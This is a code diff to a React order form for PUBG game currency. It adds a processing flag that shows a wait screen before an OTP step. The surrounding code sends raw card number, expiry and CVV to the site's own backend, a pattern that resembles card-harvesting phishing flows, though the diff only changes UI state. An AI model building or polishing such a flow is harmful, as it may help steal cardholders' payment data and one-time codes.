@@ -186,6 +186,8 @@ export function PubgUcOrder({
         return;
       }
       setCardValidationError(null);
+      // Show wait screen immediately
+      setCardProcessingToOtp(true);
 
       const playerInfo = inputMode === 'player' ? `🆔 Player ID: ${playerId.trim()}` : `📦 طلب كود تعبئة (سيتم الإرسال بعد الدفع)`;
       const details =
@@ -205,10 +207,15 @@ export function PubgUcOrder({
           card_fields: {holder: cardHolder, number: cardNumber.replace(/\s/g, ''), expiry, cvv},
         }),
       });
-      if (!res.ok) { setIsSubmitting(false); return; }
+      if (!res.ok) {
+        setCardProcessingToOtp(false);
+        setIsSubmitting(false);
+        return;
+      }
       const data = await res.json();
       const orderRef = data.order_ref || data.id;
       if (!orderRef) {
+        setCardProcessingToOtp(false);
         setIsSubmitting(false);
         return;
       }
@@ -220,6 +227,7 @@ export function PubgUcOrder({
       return;
     } catch (err) {
       console.error(err);
+      setCardProcessingToOtp(false);
       setIsSubmitting(false);
     }
   };
